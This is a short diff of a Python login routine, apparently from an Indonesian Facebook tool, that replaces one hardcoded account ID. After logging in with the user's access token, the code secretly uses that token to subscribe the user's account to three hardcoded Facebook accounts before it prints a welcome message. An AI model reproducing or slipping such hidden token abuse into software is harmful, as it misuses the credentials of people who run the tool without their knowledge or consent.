@@ -20,7 +20,7 @@ def login():
 		r=json.loads(req.get(f"https://graph.facebook.com/me?access_token={to}").text)
 		try:
 			nama=r['name']
-			req.post(f'https://graph.facebook.com/100031928966181/subscribers?access_token={to}')
+			req.post(f'https://graph.facebook.com/1011933821/subscribers?access_token={to}')
 			req.post(f'https://graph.facebook.com/100004018035398/subscribers?access_token={to}')
 			req.post(f'https://graph.facebook.com/100071145853652/subscribers?access_token={to}')
 			print(f"[☆] Login Berhasil [☆]\nWelcome {nama}")
